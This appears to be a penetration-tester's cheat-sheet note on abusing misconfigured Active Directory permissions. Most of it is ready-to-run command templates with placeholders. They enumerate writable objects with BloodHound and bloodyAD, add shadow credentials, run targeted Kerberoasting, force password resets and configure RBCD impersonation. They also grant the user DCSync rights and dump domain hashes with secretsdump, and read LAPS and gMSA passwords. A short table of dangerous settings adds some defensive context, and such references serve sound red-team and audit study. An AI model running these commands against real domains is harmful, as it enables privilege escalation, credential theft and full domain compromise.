# ACL Abuse

#ACLAbuse #DACL #ActiveDirectory #BloodHound #Privesc

## What is ACL Abuse?

Every Active Directory object (users, groups, computers, GPOs, OUs) has a DACL governing who can read or modify it. Misconfigured or over-permissive ACEs — `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `ForceChangePassword`, `AddMember`, `ReadGMSAPassword`, `ReadLAPSPassword`, and others — let a low-privileged principal escalate by directly modifying a more-privileged object instead of cracking or stealing a credential. BloodHound is the primary tool for discovering these paths at scale; PowerView (Windows) and bloodyAD (Linux) for exploiting individual edges.

- Rights live on the object's `nTSecurityDescriptor` (DACL); read/enumerable over LDAP.
- Chains matter: `WriteOwner` → `WriteDacl` → `GenericAll` is one edge at a time.
- Most edges have both a **credential** outcome (reset/read a password) and a **no-touch** outcome (shadow credentials / RBCD) — prefer the latter to avoid disrupting the account.

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/AD/BloodHound\|BloodHound]] | Discover ACL edges at scale; "shortest path to Domain Admins" |
| [[Tools/AD/PowerView\|PowerView]] | Windows: enumerate + exploit individual ACEs |
| [[Tools/AD/bloodyAD\|bloodyAD]] | Linux: `get writable`, and every write primitive (genericAll/owner/dcsync/shadow/rbcd) |
| [[Tools/AD/dacledit\|dacledit]] | Linux (impacket): read/write DACLs precisely (`WriteDacl` abuse) |
| [[Tools/AD/pyWhisker\|pyWhisker]] | Shadow credentials via `msDS-KeyCredentialLink` (GenericWrite/All → cert → TGT) |
| [[Tools/AD/rbcd\|rbcd]] | GenericWrite on a computer → Resource-Based Constrained Delegation |
| [[Tools/Lateral Movement/NetExec\|NetExec]] | `--laps`/`--gmsa` reads, LDAP ACL modules |
| [[Tools/Auth/Rubeus\|Rubeus]] | Consume shadow-cred certs (`asktgt /certificate`), targeted Kerberoast |

---

## Enumeration

```bash
# BloodHound collection (Linux collector), then query "Shortest Paths" / node "Outbound Object Control"
nxc ldap <DC> -u <user> -p <pass> --bloodhound --collection All --dns-server <DC>
# or:  bloodhound-python -u <user> -p <pass> -d <domain> -c All -ns <DC>

# bloodyAD — everything the current principal can write
bloodyAD --host <DC> -d <domain> -u <user> -p <pass> get writable

# Who has rights over a specific target? (impacket)
impacket-dacledit -action read -principal <user> -target <target> '<domain>/<user>:<pass>'
```

```powershell
# PowerView (Windows) — interesting ACLs the domain's non-privileged users hold
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match 'yourgroup'}
Get-DomainObjectAcl -Identity <target> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'Generic|WriteDacl|WriteOwner'}
```

| Right (BloodHound edge) | What it lets you do |
|---|---|
| `GenericAll` | Full control — any of the below |
| `GenericWrite` | Write non-protected attributes → SPN (Kerberoast), `msDS-KeyCredentialLink` (shadow creds), RBCD on computers |
| `WriteDacl` | Add yourself an ACE (e.g. DCSync / GenericAll) |
| `WriteOwner` | Set yourself owner → then WriteDacl |
| `ForceChangePassword` | Reset the target's password without knowing the old one |
| `AddMember` / `GenericWrite` on group | Add yourself to the group |
| `ReadLAPSPassword` | Read `ms-Mcs-AdmPwd` (local admin pw) |
| `ReadGMSAPassword` | Read `msDS-ManagedPassword` blob (gMSA) |

---

## Attack Vectors

### GenericAll / GenericWrite on a User

Three routes — prefer shadow credentials (no password change, no SPN residue).

```bash
# 1) Shadow credentials (GenericWrite is enough): add a KeyCredential, get a cert → TGT
pywhisker.py -d <domain> -u <user> -p <pass> --target <victim> --action add
#   → PFX + password; then PKINITtools/gettgtpkinit.py to get victim's TGT
gettgtpkinit.py -cert-pfx <out>.pfx -pfx-pass <pw> '<domain>/<victim>' victim.ccache

# 2) Targeted Kerberoast (set an SPN, roast, remove it) — offline crack
targetedKerberoast.py -d <domain> -u <user> -p <pass> --request-user <victim>

# 3) ForceChangePassword-style reset (disruptive — changes their password)
bloodyAD --host <DC> -d <domain> -u <user> -p <pass> set password <victim> 'NewP@ss123!'
```

```powershell
# PowerView equivalents
Set-DomainUserPassword -Identity <victim> -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)
Set-DomainObject -Identity <victim> -Set @{serviceprincipalname='fake/svc'}   # then Rubeus kerberoast
```

### GenericWrite on a Computer → RBCD

```bash
# Give a computer account you control delegation rights to the victim computer,
# then impersonate any user (e.g. Administrator) to it via S4U.
impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'VICTIM$' -action write '<domain>/<user>:<pass>'
impacket-getST -spn 'cifs/victim.domain' -impersonate Administrator -dc-ip <DC> '<domain>/ATTACKER$:<pass>'
```

### WriteDacl → DCSync / GenericAll

```bash
# Grant yourself DCSync rights on the domain head, then dump hashes
bloodyAD --host <DC> -d <domain> -u <user> -p <pass> add dcsync <user>
impacket-secretsdump -just-dc '<domain>/<user>:<pass>@<DC>'

# Or grant full control over any object via impacket dacledit
impacket-dacledit -action write -rights FullControl -principal <user> -target <victim> '<domain>/<user>:<pass>'
```

### WriteOwner → WriteDacl → GenericAll

```bash
# Become the object's owner, then give yourself full control
bloodyAD --host <DC> -d <domain> -u <user> -p <pass> set owner <target> <user>
bloodyAD --host <DC> -d <domain> -u <user> -p <pass> add genericAll <target> <user>
```

### AddMember / GenericWrite on a Group

```bash
bloodyAD --host <DC> -d <domain> -u <user> -p <pass> add groupMember '<Target Group>' <user>
# Windows:  Add-DomainGroupMember -Identity '<Target Group>' -Members <user>
```

### ReadLAPSPassword — Local Admin Password Read

`ReadLAPSPassword` (or GenericAll) on a computer object lets you read the managed local-admin password.

```bash
nxc ldap <DC> -u <user> -p <pass> --laps                       # legacy ms-Mcs-AdmPwd + Windows LAPS
bloodyAD --host <DC> -d <domain> -u <user> -p <pass> get object <COMPUTER$> --attr ms-Mcs-AdmPwd
# Windows: LAPSToolkit → Get-LAPSComputers
```

### ReadGMSAPassword — gMSA Password Blob

`ReadGMSAPassword` on a gMSA lets you compute its NT hash from `msDS-ManagedPassword`.

```bash
nxc ldap <DC> -u <user> -p <pass> --gmsa                        # dumps the NT hash directly
# or gMSADumper.py -u <user> -p <pass> -d <domain>
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Non-privileged users with `GenericAll`/`GenericWrite` on privileged objects | Direct privesc (shadow creds, Kerberoast, reset) |
| `WriteDacl`/`WriteOwner` on the domain object | Self-grant DCSync → full domain compromise |
| `GenericWrite` on computer accounts | RBCD → impersonate any user to that host |
| LAPS `ms-Mcs-AdmPwd` readable by wide groups | Local admin password disclosure |
| gMSA `ReadGMSAPassword` granted broadly | Service-account hash theft → silver tickets |
| `msDS-KeyCredentialLink` writable (no ADCS needed) | Shadow credentials → passwordless auth as target |
| Nested group ownership / `AddMember` self-service | Quiet path into privileged groups |

---

## Quick Reference

| Goal | Command |
|---|---|
| Find writable objects | `bloodyAD ... get writable` / `Find-InterestingDomainAcl -ResolveGUIDs` |
| Shadow creds (GenericWrite) | `pywhisker.py ... --target <v> --action add` → `gettgtpkinit.py` |
| Targeted Kerberoast | `targetedKerberoast.py -d <d> -u <u> -p <p> --request-user <v>` |
| Reset password | `bloodyAD ... set password <v> 'New!'` |
| WriteDacl → DCSync | `bloodyAD ... add dcsync <u>` → `secretsdump -just-dc` |
| WriteOwner chain | `bloodyAD ... set owner <t> <u>` → `add genericAll <t> <u>` |
| Add to group | `bloodyAD ... add groupMember '<grp>' <u>` |
| RBCD (GenericWrite computer) | `impacket-rbcd -delegate-from 'A$' -delegate-to 'V$' -action write ...` |
| Read LAPS | `nxc ldap <DC> -u <u> -p <p> --laps` |
| Read gMSA | `nxc ldap <DC> -u <u> -p <p> --gmsa` |

---

> [!note] **See also** — over-permissive ACEs are discovered via [[Services/Network Management/LDAP|LDAP]] enumeration (`bloodyAD get writable`, BloodHound collection) and worked with [[Tools/AD/bloodyAD|bloodyAD]]/[[Tools/AD/PowerView|PowerView]]. Shadow-credential and RBCD chains overlap with [[Services/Active Directory/Kerberos|Kerberos]] (S4U, PKINIT); WriteDacl→DCSync feeds [[Services/Active Directory/ADCS|ADCS]]/credential-dumping. GPO object ACLs are their own note: [[Services/Active Directory/GPO Abuse|GPO Abuse]].

---

*Created: 2026-07-27*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
